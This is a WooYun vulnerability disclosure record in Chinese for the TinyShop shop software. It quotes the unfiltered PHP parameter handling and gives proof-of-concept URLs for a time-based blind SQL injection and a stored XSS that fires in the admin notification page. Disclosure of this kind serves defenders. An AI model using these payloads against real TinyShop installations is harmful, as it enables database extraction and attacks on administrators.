{"id": 51680, "wybug_id": "wooyun-2014-073720", "wybug_title": "TinyShop同一处盲注和存储型xss", "wybug_corp": "tinyrise.com", "wybug_author": "zxx", "wybug_date": "2014-08-26 11:59", "wybug_open_date": "2014-11-24 12:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向公众公开  简要描述： 参数未进行过滤，导致同一位置出现sql注入和可打后台存储xss。 详细说明：  先看看tinyshop如何处理传递的参数：/framework/lib/util/request_class.php中\npublic static function get()    {        $num = func_num_args();        $args = func_get_args();        if($num==1)        {            if(isset($_GET[$args[0]])){                if(is_array($_GET[$args[0]]))return $_GET[$args[0]];                else return trim($_GET[$args[0]]);            }            return null;        }        else if($num>=2)        {            if($args[1]!==null)$_GET[$args[0]] = $args[1];            else if(isset($_GET[$args[0]])) unset($_GET[$args[0]]);        }        else        {            return $_GET;        }    }    //对应处理$_POST    public static function post()    {        $num = func_num_args();        $args = func_get_args();        if($num==1)        {            if(isset( $_POST[$args[0]])){                if(is_array( $_POST[$args[0]]))return  $_POST[$args[0]];                else return trim( $_POST[$args[0]]);            }            return null;        }        else if($num>=2)        {            if($args[1]!==null)\t$_POST[$args[0]] = $args[1];            else if(isset($_POST[$args[0]])) unset($_POST[$args[0]]);        }        else        {            return $_POST;        }    }    //同时处理$_GET $_POST    public static function args()    {        $num = func_num_args();        $args = func_get_args();        if($num==1)        {            if(isset($_POST[$args[0]])){                if(is_array($_POST[$args[0]]))return $_POST[$args[0]];                else return trim($_POST[$args[0]]);            }            else{                if(isset($_GET[$args[0]])){                    if(is_array($_GET[$args[0]]))return $_GET[$args[0]];                    else return trim($_GET[$args[0]]);                }            }            return null;        }        else if($num>=2)        {            if($args[1]!==null)            {                $_POST[$args[0]] = $args[1];                $_GET[$args[0]] = $args[1];            }            else            {                if(isset($_GET[$args[0]])) unset($_GET[$args[0]]);                if(isset($_POST[$args[0]])) unset($_POST[$args[0]]);            }        }        else        {            return $_POST+$_GET;        }    }\n从上面可以看出，只是将POST和GET的方法封装到Req类里，并没有过滤。弱点出现在/protected/controllers/index.php中\npublic function notify()    {        $goods_id = Filter::int(Req::args('goods_id'));        $email = Req::args('email');//        $mobile = Req::args('mobile');//email和mobile都没过滤        $model =  new Model('notify');        $register_time = Date('Y-m-d H:i:s');        $info = array('status'=>'fail','msg'=>'您还没有登录，无法订阅到货通知。');        if(isset($this->user['id'])){            $time = date('Y-m-d H:i:s' , strtotime('-3 day'));            $obj = $model->where('user_id = '.$this->user['id'].' and goods_id='.$goods_id.' and register_time >'.\"'$time'\")->find();            if($obj){                $info = array('status'=>'warning','msg'=>'您已订阅过了该商品的到货通知。');            }else{                $data = array('user_id'=>$this->user['id'],'goods_id'=>$goods_id,'register_time'=>$register_time,'email'=>$email,'mobile'=>$mobile);                $last_id = $model->data($data)->insert();//未过滤的数据插入数据库                if($last_id>0)$info = array('status'=>'success','msg'=>'订阅成功。');                else $info = array('status'=>'fail','msg'=>'订阅失败。');            }        }        echo JSON::encode($info);    }\n   漏洞证明：  注入：因为没有回显，也不能报错，就得基于时间盲注了：http://localhost/index.php?con=index&act=notify&goods_id=1&email=111',(if(substring(user(),1,1)=char(114),sleep(5),798))) %23&mobile=1如果user的第一位是r，那么就延迟5秒。\n\nxss:http://localhost/index.php?con=index&act=notify&goods_id=2&email=<script>alert(\\'zxx\\');</script>&mobile=111\n\n管理员后台查看到货通知处：\n\n   修复方案：  过滤一下   版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2014-08-28 16:08 厂商回复： 非常感谢您为TinyShop信息安全做的贡献，此问题已经360库带反馈，不过仍然感谢你的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}